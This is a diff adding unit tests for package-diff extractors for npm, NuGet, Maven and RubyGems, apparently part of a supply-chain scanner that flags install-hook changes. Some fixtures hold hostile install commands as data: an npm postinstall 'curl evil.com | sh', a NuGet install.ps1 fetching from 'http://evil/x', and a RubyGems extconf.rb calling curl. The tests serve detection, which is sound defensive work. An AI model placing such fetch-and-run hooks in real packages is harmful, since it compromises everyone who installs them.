@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import io
+import json as _json
 import os
 import sys
 import tarfile
@@ -22,7 +23,11 @@ from extractors_diff._common import (  # noqa: E402
     truncate_content,
     is_path_traversal,
 )
+from extractors_diff.maven import extract as extract_maven  # noqa: E402
+from extractors_diff.npm import extract as extract_npm  # noqa: E402
+from extractors_diff.nuget import extract as extract_nuget  # noqa: E402
 from extractors_diff.pypi import extract as extract_pypi  # noqa: E402
+from extractors_diff.rubygems import extract as extract_rubygems  # noqa: E402
 
 
 # --- _common.py unit tests ---------------------------------------------------
@@ -303,3 +308,135 @@ class TestPyPIDiffExtractor:
             assert len(diff_text) <= 100_000  # not the full 5 MB
         else:
             assert any("big.py" in p for p in payload["ignored_changed_paths"])
+
+
+# --- Helpers for NPM / NuGet / Maven / RubyGems tests ------------------------
+
+def _make_npm_tarball(path, files: dict[str, str]):
+    """Create an npm-style tarball with files nested under package/."""
+    with tarfile.open(path, "w:gz") as tf:
+        for name, content in files.items():
+            blob = content.encode("utf-8")
+            info = tarfile.TarInfo(name=f"package/{name}")
+            info.size = len(blob)
+            tf.addfile(info, io.BytesIO(blob))
+
+
+def _make_nupkg(path, files: dict[str, str]):
+    with zipfile.ZipFile(path, "w") as zf:
+        for name, content in files.items():
+            zf.writestr(name, content)
+
+
+def _make_jar(path, files: dict[str, str]):
+    _make_nupkg(path, files)
+
+
+def _make_gem(path, data_files: dict[str, str]):
+    """Create a .gem (outer tar with data.tar.gz inside)."""
+    inner = io.BytesIO()
+    with tarfile.open(fileobj=inner, mode="w:gz") as inner_tf:
+        for name, content in data_files.items():
+            blob = content.encode("utf-8")
+            info = tarfile.TarInfo(name=name)
+            info.size = len(blob)
+            inner_tf.addfile(info, io.BytesIO(blob))
+    inner_blob = inner.getvalue()
+
+    with tarfile.open(path, "w") as outer:
+        info = tarfile.TarInfo(name="data.tar.gz")
+        info.size = len(inner_blob)
+        outer.addfile(info, io.BytesIO(inner_blob))
+        meta = b'{"name":"foo","version":"1.0"}'
+        info2 = tarfile.TarInfo(name="metadata.gz")
+        info2.size = len(meta)
+        outer.addfile(info2, io.BytesIO(meta))
+
+
+class TestNPMDiffExtractor:
+    def test_postinstall_change_surfaced_as_synthetic(self, tmp_path):
+        new = tmp_path / "foo-1.1.tgz"
+        old = tmp_path / "foo-1.0.tgz"
+        _make_npm_tarball(new, {
+            "package.json": _json.dumps({
+                "name": "foo", "version": "1.1",
+                "scripts": {"postinstall": "curl evil.com | sh"},
+            }),
+            "index.js": "module.exports = {};",
+        })
+        _make_npm_tarball(old, {
+            "package.json": _json.dumps({
+                "name": "foo", "version": "1.0",
+                "scripts": {"postinstall": "echo hello"},
+            }),
+            "index.js": "module.exports = {};",
+        })
+
+        payload = extract_npm(str(new), str(old))
+        assert not payload["error"]
+        assert "npm:scripts/postinstall" in payload["modified"]
+        assert "npm:scripts/postinstall" in payload["install_hook_paths"]
+        diff_text = payload["modified"]["npm:scripts/postinstall"][0]
+        assert "curl evil.com" in diff_text
+
+
+class TestNuGetDiffExtractor:
+    def test_install_ps1_change(self, tmp_path):
+        new = tmp_path / "Foo.1.1.nupkg"
+        old = tmp_path / "Foo.1.0.nupkg"
+        _make_nupkg(new, {
+            "tools/install.ps1": "Invoke-WebRequest -Uri 'http://evil/x'",
+            "lib/net6.0/Foo.dll": "dummy",
+        })
+        _make_nupkg(old, {
+            "tools/install.ps1": "Write-Host 'installed'",
+            "lib/net6.0/Foo.dll": "dummy",
+        })
+        payload = extract_nuget(str(new), str(old))
+        assert not payload["error"]
+        assert "tools/install.ps1" in payload["install_hook_paths"]
+        assert "tools/install.ps1" in payload["modified"]
+
+
+class TestMavenDiffExtractor:
+    def test_jar_pom_xml_modified(self, tmp_path):
+        new = tmp_path / "foo-1.1.jar"
+        old = tmp_path / "foo-1.0.jar"
+        _make_jar(new, {
+            "META-INF/maven/foo/pom.xml": "<project><version>1.1</version></project>",
+            "Foo.class": "dummy bytes",
+        })
+        _make_jar(old, {
+            "META-INF/maven/foo/pom.xml": "<project><version>1.0</version></project>",
+            "Foo.class": "dummy bytes",
+        })
+        payload = extract_maven(str(new), str(old))
+        assert not payload["error"]
+        assert any(p.endswith("pom.xml") for p in payload["modified"])
+
+    def test_bare_pom_artifact(self, tmp_path):
+        new = tmp_path / "foo-1.1.pom"
+        old = tmp_path / "foo-1.0.pom"
+        new.write_text("<project><version>1.1</version></project>")
+        old.write_text("<project><version>1.0</version></project>")
+        payload = extract_maven(str(new), str(old), original_filename="foo-1.1.pom")
+        assert not payload["error"]
+        assert "pom.xml" in payload["modified"]
+
+
+class TestRubyGemsDiffExtractor:
+    def test_extconf_rb_change(self, tmp_path):
+        new = tmp_path / "foo-1.1.gem"
+        old = tmp_path / "foo-1.0.gem"
+        _make_gem(new, {
+            "ext/native/extconf.rb": "system('curl evil.com')",
+            "lib/foo.rb": "module Foo; VERSION='1.1'; end",
+        })
+        _make_gem(old, {
+            "ext/native/extconf.rb": "require 'mkmf'\ncreate_makefile('foo')",
+            "lib/foo.rb": "module Foo; VERSION='1.0'; end",
+        })
+        payload = extract_rubygems(str(new), str(old))
+        assert not payload["error"]
+        assert "ext/native/extconf.rb" in payload["install_hook_paths"]
+        assert "ext/native/extconf.rb" in payload["modified"]
